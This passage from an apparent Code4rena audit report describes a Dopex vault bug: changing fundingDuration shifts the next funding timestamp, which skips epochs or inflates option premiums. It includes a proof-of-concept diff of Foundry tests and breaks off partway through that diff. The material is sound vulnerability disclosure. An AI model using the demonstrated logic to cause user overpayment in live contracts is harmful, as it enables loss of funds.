<code>PerpetualAtlanticVault.nextFundingPaymentTimestamp()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/850\">0xTheC0der</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2178\">nirlin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2139\">__141345__</a>, QiuhaoLi (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2109\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1967\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1807\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1614\">0xbranded</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1556\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1554\">0Kage</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1362\">pep7siup</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1244\">836541</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1194\">joaovwfreire</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/980\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/947\">ABA</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/897\">alexfilippov314</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/842\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/773\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/692\">0xDING99YA</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/638\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/612\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/556\">SpicyMeatball</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/154\">degensec</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/142\">Kow</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/125\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/53\">0xHelium</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1092\">tnquanghuy0512</a></em></p>\n<p>The return value of <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L562-L569\">PerpetualAtlanticVault.nextFundingPaymentTimestamp()</a>, which marks the beginning of the next funding epoch, scales linearly with the current <code>fundingDuration</code>. (Note that <code>latestFundingPaymentPointer</code> is strictly monotonically increasing with each epoch.)<br>\nTherefore, epochs are separated by a period of <code>fundingDuration</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">genesis</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">fundingDuration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>However, the owner can change the <code>fundingDuration</code> at any time via <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L233-L241\">PerpetualAtlanticVault.updateFundingDuration(…)</a> which is an <strong>intended feature</strong> of the contract, otherwise the funding duration would be <strong>immutable</strong>.</p>\n<h3 id=\"first-order-consequences\" style=\"position:relative;\"><a href=\"#first-order-consequences\" aria-label=\"first order consequences permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>First order consequences</h3>\n<p>Assume the owner changes the <code>fundingDuration</code> by a value <code>delta</code>, such that: <code>new fundingDuration = old fundingDuration + delta</code>.\nAs a result, the return value of <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L562-L569\">PerpetualAtlanticVault.nextFundingPaymentTimestamp()</a> moves by a value of <code>latestFundingPaymentPointer * delta</code> into the <strong>future</strong> or <strong>past</strong> (depending on the sign of <code>delta</code>).</p>\n<p><em>Numerical example:</em>\nThe <code>fundingDuration = 7 days</code> and is slightly reduced by <code>delta = -1 hour</code>.<br>\nThe protocol is alread live for nearly 2 years, therefore <code>latestFundingPaymentPointer = 96</code>.<br>\nConsequently, the next funding epoch “begins” <code>latestFundingPaymentPointer * delta = -96 hours = -4 days</code> in the <strong>past</strong>.</p>\n<p>The <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L562-L569\">PerpetualAtlanticVault.nextFundingPaymentTimestamp()</a> is called at <strong>14 instances</strong> throughout the <code>PerpetualAtlanticVault</code> contract and once by the <code>RdpxV2Core</code> contract for bonding cost calculation, see <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1192-L1194\">RdpxV2Core.calculateBondCost(…)</a>.</p>\n<h3 id=\"second-order-consequences\" style=\"position:relative;\"><a href=\"#second-order-consequences\" aria-label=\"second order consequences permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Second order consequences</h3>\n<p>Due the scattered impacts of the present bug, there arise multiple problems. Nevertheless, this report solely focuses on the following consquences in order to emphasize the severity of this issue.</p>\n<h3 id=\"perpetualatlanticvaultupdatefundingpaymentpointer\" style=\"position:relative;\"><a href=\"#perpetualatlanticvaultupdatefundingpaymentpointer\" aria-label=\"perpetualatlanticvaultupdatefundingpaymentpointer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L461-L496\">PerpetualAtlanticVault.updateFundingPaymentPointer()</a></h3>\n<p>This helper method is (implicitly) called by the <code>updateFunding()</code>, <code>purchase(...)</code>, <code>settle(...)</code> and <code>calculateFunding(...)</code> methods, but not by the <code>payFunding()</code> method of the contract.<br>\nIt is responsible for iteratively bringing the <code>latestFundingPaymentPointer</code> into the present while funding the LP with collateral for each epoch.</p>\n<p>In case of “time travel” by changing the <code>fundingDuration</code> it will do the following:</p>\n<ul>\n<li><code>nextFundingPaymentTimestamp()</code> lies in the past: It will iterarte until <code>nextFundingPaymentTimestamp()</code> lies in the future, thereby <strong>immediately</strong> ending the current epoch and skipping the following ones, see PoC.</li>\n<li><code>nextFundingPaymentTimestamp()</code> lies in the future: Once the overly long epoch <code>old fundingDuration + delta * latestFundingPaymentPointer</code> expires, it will <strong>overpay</strong> collateral for this epoch to the LP, see <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L473-L477\">L473-L477</a>.</li>\n</ul>\n<h3 id=\"perpetualatlanticvaultpurchase\" style=\"position:relative;\"><a href=\"#perpetualatlanticvaultpurchase\" aria-label=\"perpetualatlanticvaultpurchase permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L254-L312\">PerpetualAtlanticVault.purchase(…)</a></h3>\n<p>This method is called by the core contract when bonding in order to buy options. Thereby the option premium is heavily dependent on the return value of <code>nextFundingPaymentTimestamp()</code>, see <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L283-L286\">L283-L286</a>.</p>\n<p>In case of an overly long epoch <code>old fundingDuration + delta * latestFundingPaymentPointer</code> due to an increase of the <code>fundingDuration</code> by <code>delta</code>, the option premium is excessively increased leading to a loss of funds for the user/protocol by using up a great part of the reserve WETH for the option, see core contract <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L918-L924\">L918-L924</a> and PoC.<br>\nSubsequently the bonding gets more expensive, i.e. the user has to supply more WETH, see also <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1192-L1198\">RdpxV2Core.calculateBondCost(…)</a>.</p>\n<p>For reference, the correct epoch duration in this case should be <code>old fundingDuration + delta</code>.<br>\nThe affected entry point methods are <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L887-L933\">RdpxV2Core.bond(…)</a> and <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L810-L885\">RdpxV2Core.bondWithDelegate(…)</a>.<br>\nThis is also time critical in another way, since the user cannot know if the <code>fundingDuration</code> was changed <strong>after</strong> calculating the bonding cost via <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1192-L1198\">RdpxV2Core.calculateBondCost(…)</a>, but <strong>before</strong> his bonding transaction.</p>\n<h3 id=\"conclusion\" style=\"position:relative;\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h3>\n<p>The resulting funding period / epoch inconsistencies by jumping in time, as well as the execessivley overpriced options, which do lead to loss of funds when bought during that epoch, are sufficient to strongly disincentivize users from bonding. This consequently endagers the peg which can be considered the most valuable asset of the protocol.</p>\n<p>Futhermore, the user cannot know if the <code>fundingDuration</code> was changed before his transaction is executed which poses an additional risk.</p>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In order to prove the above claims, three new test cases were added. The last assertion in each of those cases fails in order to demonstrate the issues.</p>\n<ul>\n<li><code>testUpdateFundingPaymentPointerPast()</code>: The return value of <code>nextFundingPaymentTimestamp()</code> lies in the past and multiple epochs are skipped on <code>updateFundingPaymentPointer()</code>.</li>\n<li><code>testUpdateFundingPaymentPointerPast()</code>: The return value of <code>nextFundingPaymentTimestamp()</code> lies in the future, therefore the current epoch is overly long and won’t change on <code>updateFundingPaymentPointer()</code> after waiting for <code>new fundingDuration</code>.</li>\n<li><code>testPurchaseExtendedEpoch()</code>: Shows the excessive increase in option premium on a slight increase of <code>fundingDuration</code>, i.e. unjustified overuse/loss of funds.</li>\n</ul>\n<p>Just apply the <em>diff</em> below and run the test cases with <code>forge test -vv --match-test testUpdateFundingPaymentPointer</code> and <code>forge test -vv --match-test testPurchaseExtendedEpoch</code>:</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/mocks/MockOptionPricing.sol b/contracts/mocks/MockOptionPricing.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 5b77b16..c8e92f1 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/mocks/MockOptionPricing.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/mocks/MockOptionPricing.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -8,8 +8,8 @@ contract MockOptionPricing is IOptionPricing {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 timeToExpiry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) external pure override returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    return 5e6; // 0.05 weth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    return 5e6 * timeToExpiry / 1 days; // 0.05 weth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/tests/perp-vault/Unit.t.sol b/tests/perp-vault/Unit.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index c8016e0..dcfd72a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/tests/perp-vault/Unit.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/tests/perp-vault/Unit.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -108,6 +108,33 @@ contract Unit is ERC721Holder, Setup {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     vault.purchase(300 ether, address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  function testPurchaseExtendedEpoch() external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    testDeposit();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    skip(vault.fundingDuration() * 10); // expire 10 epochs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    vault.updateFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 timeTillExpiry = vault.nextFundingPaymentTimestamp() -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      block.timestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    // uses calculates expected option premium</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 expectedPremium = vault.calculatePremium(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      0.015 gwei,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      500 ether,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      timeTillExpiry,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      0.02 gwei</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    // owner happends to extend funding duration --&gt; severely increases option premium</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    vault.updateFundingDuration(vault.fundingDuration() + 1 hours);  // comment this line to see test case pass</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    // user doesn&#39;t know about the bug and funding duration change --&gt; overpays for option</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    (uint256 paidPremium, ) = vault.purchase(500 ether, address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    assertEq(paidPremium, expectedPremium);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function testCalculatePremium() external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 pnl = vault.calculatePnl(0.01 gwei, 0.015 gwei, 1 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     assertEq(pnl, 0.05 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -291,6 +318,47 @@ contract Unit is ERC721Holder, Setup {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     assertEq(pointer, 2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  function testUpdateFundingPaymentPointerPast() external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 pointer = vault.latestFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    assertEq(pointer, 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    skip(vault.fundingDuration()); // expire</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    vault.updateFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    pointer = vault.latestFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    assertEq(pointer, 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    skip(vault.fundingDuration()*95);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    purchaseOneOption(); // updates payment pointer if block.timestamp &gt; nextFundingPaymentTimestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    pointer = vault.latestFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    assertEq(pointer, 96);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    vault.updateFundingDuration(vault.fundingDuration() - 1 hours); // reduce funding duration by 1 hour</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    skip(vault.fundingDuration()); // expire</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    vault.updateFundingPaymentPointer();  // updates payment pointer if block.timestamp &gt; nextFundingPaymentTimestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    pointer = vault.latestFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    assertEq(pointer, 97); // fails: we would expect 97 but actually skipped 4 epochs due to &quot;time traveling&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  function testUpdateFundingPaymentPointerFuture() external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 pointer = vault.latestFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    assertEq(pointer, 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    skip(vault.fundingDuration()); // expire</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    vault.updateFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    pointer = vault.latestFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    assertEq(pointer, 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    skip(vault.fundingDuration()*95);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    purchaseOneOption(); // updates payment pointer if block.timestamp &gt; nextFundingPaymentTimestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    pointer = vault.latestFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    assertEq(pointer, 96);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    vault.updateFundingDuration(vault.fundingDuration() + 1 hours); // increase funding duration by 1 hour</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    skip(vault.fundingDuration()); // expire</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    vault.updateFundingPaymentPointer();  // updates payment pointer if block.timestamp &gt; nextFundingPaymentTimestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    pointer = vault.latestFundingPaymentPointer();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    assertEq(pointer, 97); // fails: we would expect 97 but it&#39;s still 96 because the next epoch lies 4 days in the future</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 